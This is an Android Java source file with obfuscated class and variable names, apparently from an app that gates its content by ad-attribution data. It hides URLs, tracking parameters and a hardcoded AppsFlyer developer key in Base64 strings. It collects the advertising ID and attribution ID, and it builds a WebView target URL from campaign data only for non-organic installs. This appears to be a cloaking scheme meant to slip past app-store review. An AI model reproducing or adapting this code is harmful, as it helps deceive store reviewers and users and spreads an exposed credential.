package com.ccrrazy.weessttern.uioowq;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.webkit.WebView;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;
import com.onesignal.OneSignal;

import java.io.IOException;
import java.util.Map;

public class Pposxop extends AppCompatActivity {
    public static String ibdad;
    public static String insdad = "";
    public static String iuhsq;
    public static String poijuh;
    public static String oijnaq = "RXhvUHpVcXJtWjdmYWZlQnllQkdnaQ==";

    static String iuuhd;
    static String oiuytbbd;
    static String qwead;
    static String cdsad;
    static String bhbhb;
    static String llldj;
    static String iunjnds;
    public static String udsj;
    public static String ooijnda;

    WebView yejcj;
    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(1024);
        setContentView(R.layout.proro);
        yejcj = findViewById(R.id.yejcj);
        dc(10);
    }

    @Override
    public void onBackPressed() {
        startActivity(new Intent(getApplicationContext(),CW.class));
        finishAffinity();
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void dc(int i){
        yejcj.loadUrl(MainActivity.mmm("aHR0cHM6Ly93d3cucHJpdmFjeXBvbGljeW9ubGluZS5jb20vbGl2ZS5waHA/dG9rZW49VEhXTEpOcDdGT3lxSnBydkgwNXZjTWQxejV2azBxWko="));
        int b = 1;
        for (int a = 0; a<i; a++){
           b++;
        }
    }


    @RequiresApi(api = Build.VERSION_CODES.O)
    public static void appPpPp(CW cw){

        ibdad = AppsFlyerLib.getInstance().getAppsFlyerUID(cw.getApplicationContext());

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    iuhsq = AdvertisingIdClient.getAdvertisingIdInfo(cw.getApplicationContext()).getId();
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (GooglePlayServicesNotAvailableException e) {
                    e.printStackTrace();
                } catch (GooglePlayServicesRepairableException e) {
                    e.printStackTrace();
                }
            }
        }).start();


        AppsFlyerLib.getInstance().init(MainActivity.mmm(oijnaq), new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> map) {
                insdad = map.get(MainActivity.mmm("YWZfc3RhdHVz")).toString();
                if (insdad.equals(MainActivity.mmm("Tm9uLW9yZ2FuaWM="))){
                    String str =map.get(MainActivity.mmm("Y2FtcGFpZ24=")).toString();
                    poijuh = pdp(str,cw.getPackageName(), iuhsq, ibdad);
                }

            }

            @Override
            public void onConversionDataFail(String s) {

            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {

            }

            @Override
            public void onAttributionFailure(String s) {

            }
        },cw.getApplicationContext());
        AppsFlyerLib.getInstance().start(cw.getApplicationContext());
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static String pdp(String ews, String xxsa, String oinm, String udbah){


        String[] str = ews.split("::");
        try {
            iuuhd = str[0];
        }catch (Exception e){
            iuuhd = "";
        }
        try {
            oiuytbbd = str[1];
        }catch (Exception e){
            oiuytbbd = "";
        }

        try {
            qwead = str[2];
        }catch (Exception e){
            qwead = "";

        }

        try {
            cdsad = str[3];
        }catch (Exception e){
            cdsad = "";
        }

        try {
            bhbhb = str[4];
        }catch (Exception e){
            bhbhb = "";
        }


        try {
            llldj = str[5];
        }catch (Exception e){
            llldj = "";
        }

        try {
            iunjnds = str[6];
        }catch (Exception e){
            iunjnds = "";
        }

        OneSignal.sendTag(MainActivity.mmm("c3ViX2FwcA=="), oiuytbbd);

        String paramsBuild = MainActivity.mmm("P2J1bmRsZT0=") + xxsa + MainActivity.mmm("JmFkX2lkPQ==") + oinm + MainActivity.mmm("JmFwcHNfaWQ9") + udbah +
                MainActivity.mmm("JnN1YjY9") + oiuytbbd +
                MainActivity.mmm("JnN1Yjc9") + qwead +
                MainActivity.mmm("JnN1YjI9") + cdsad +
                MainActivity.mmm("JnN1YjM9") + bhbhb +
                MainActivity.mmm("JnN1YjQ9") + llldj +
                MainActivity.mmm("JnN1YjU9") + iunjnds +
                MainActivity.mmm("JmRldl9rZXk9") + MainActivity.mmm(oijnaq);

        return  iuuhd + paramsBuild;
    }


    public static void didididwq(CW cw){

        FacebookSdk.setApplicationId(CW.ijja);
        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
        FacebookSdk.sdkInitialize(cw.getApplicationContext());
        FacebookSdk.fullyInitialize();
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.setAutoLogAppEventsEnabled(true);

        AppEventsLogger.activateApp(cw.getApplication());
        AppLinkData.fetchDeferredAppLinkData(cw.getApplicationContext(), new AppLinkData.CompletionHandler() {
            @RequiresApi(api = Build.VERSION_CODES.O)
            @Override
            public void onDeferredAppLinkDataFetched(@Nullable AppLinkData appLinkData) {
                if (appLinkData == null) {
                    appLinkData = AppLinkData.createFromActivity(cw);
                }
                if (appLinkData != null) {
                    Uri url = appLinkData.getTargetUri();
                    udsj = url.getQuery();
                    ooijnda = pdp(udsj,cw.getPackageName(), iuhsq, ibdad);
                }else {

                }
            }
        });

    }

}
